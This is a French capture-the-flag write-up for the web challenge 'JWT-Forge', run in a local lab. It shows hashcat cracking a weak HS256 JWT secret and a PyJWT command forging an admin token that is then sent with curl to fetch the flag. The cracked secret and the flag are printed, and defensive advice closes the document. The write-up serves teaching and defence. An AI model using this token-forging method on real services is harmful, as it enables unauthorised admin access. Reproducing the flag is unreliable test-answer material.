---
# Imported from Obsidian: NCTF_2025/JWT-Forge.md
# Draft: unknown source
title: JWT-Forge
category: Web
difficulty: Medium
ctf: Unknown
date: 2026-10-06
summary: 'Après création d''un compte, le dashboard propose un bouton « Voir le flag (si vous êtes admin) ». Le code JS est explicite :'
tags:
- web
lang: fr
draft: true
imported: true
---

> Plateforme : **NCTF** — Challenge web (lab Docker local, port 5561)

## Informations

- **Catégorie :** Web (JWT — secret HS256 faible)
- **Difficulté :** Moyenne
- **Auteur du write-up :** 3ch0
- **Stack :** PHP / JWT HS256
- **Flag :** `NCTF{n3v3r_tru5t_a_w34k_hs256_s3cr3t}`

---

## 1. Reconnaissance

Après création d'un compte, le dashboard propose un bouton « Voir le flag (si vous êtes admin) ». Le code JS est explicite :

```javascript
const token = sessionStorage.getItem('token');
const r = await fetch('flag.php', {
  headers: { 'Authorization': 'Bearer ' + token }
});
```

Le flag est servi par `flag.php`, protégé par un **JWT** envoyé dans l'en-tête `Authorization`. Un compte normal → `forbidden`.

---

## 2. Analyse du token

Token récupéré depuis `sessionStorage`, décodé (jwt.io) :

```json
Header  : {"alg":"HS256","typ":"JWT"}
Payload : {"user_id":"d85abba3-5ae4-615f204a6d39","role":"user","exp":1791289295}
```

`alg: HS256` → signature symétrique (HMAC-SHA256) avec un **secret partagé**. Si ce secret est faible, on peut le brute-forcer hors-ligne et **reforger** un token arbitraire. Le champ `role: user` est la cible : il faut `admin`.

---

## 3. Crack du secret (hashcat)

Le JWT se casse en mode `16500`, avec une wordlist de secrets JWT courants (récupérée sur GitHub) :

```bash
hashcat -m 16500 token.txt jwt_secret.txt
```

```text
eyJhbGci...mTtEpc:serucity_is_secure_beacuse_it_is
Status...........: Cracked
```

Secret trouvé : **`serucity_is_secure_beacuse_it_is`**. Le HMAC n'est solide que si le secret l'est — ici il tombe en une seconde.

---

## 4. Reforge du token admin

On remplace `role` par `admin` et on resigne avec le secret cracké. Deux pièges évités ici :

- **ne pas se fier à jwt.io seul** → reforge déterministe avec PyJWT ;
- **l'`exp`** : l'`exp` d'origine (`1791289295`) arrivait à échéance au moment du test → token « invalide ». Il faut repousser `exp` dans le futur.

```bash
TOKEN=$(python3 -c "import jwt,time;print(jwt.encode({'user_id':'d85abba3-5ae4-615f204a6d39','role':'admin','exp':int(time.time())+86400},'serucity_is_secure_beacuse_it_is',algorithm='HS256'))")
```

Possédant le secret, n'importe quel `exp` valide est accepté : le serveur refait le HMAC et vérifie la date.

---

## 5. Récupération du flag

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://172.20.0.2/flag.php
```

```text
NCTF{n3v3r_tru5t_a_w34k_hs256_s3cr3t}
```

**Flag :** `NCTF{n3v3r_tru5t_a_w34k_hs256_s3cr3t}`

---

## Récapitulatif

1. `flag.php` protégé par un **JWT HS256** dans `Authorization: Bearer`.
2. Décodage → `role: user`, algorithme HS256 (secret symétrique).
3. **hashcat -m 16500** + wordlist → secret faible `serucity_is_secure_beacuse_it_is`.
4. Reforge avec `role: admin` **et** un `exp` futur (PyJWT).
5. `curl` sur `flag.php` avec le token admin → flag.

> **Concept clé :** la sécurité d'un JWT `HS256` repose **entièrement** sur la force du secret. La signature empêche de modifier le payload… tant que l'attaquant ne connaît pas la clé. Un secret devinable (mot de passe, phrase, valeur par défaut) se casse hors-ligne en masse avec hashcat (`-m 16500`) : dès lors on forge n'importe quel token — ici `role: admin`. Deux réflexes à retenir côté exploitation : reforger avec une bibliothèque fiable plutôt que de dépendre d'un éditeur web, et **vérifier le `exp`** — un token au bon rôle mais expiré est rejeté comme invalide (c'est ce qui faisait échouer la première tentative). Défenses : secret long et aléatoire (≥ 256 bits), ou passage à une signature **asymétrique** (`RS256`/`ES256`) où seul le serveur détient la clé privée ; et ne jamais faire confiance au `role` porté par le client — le vérifier côté serveur contre la base.

---

***— 3ch0***
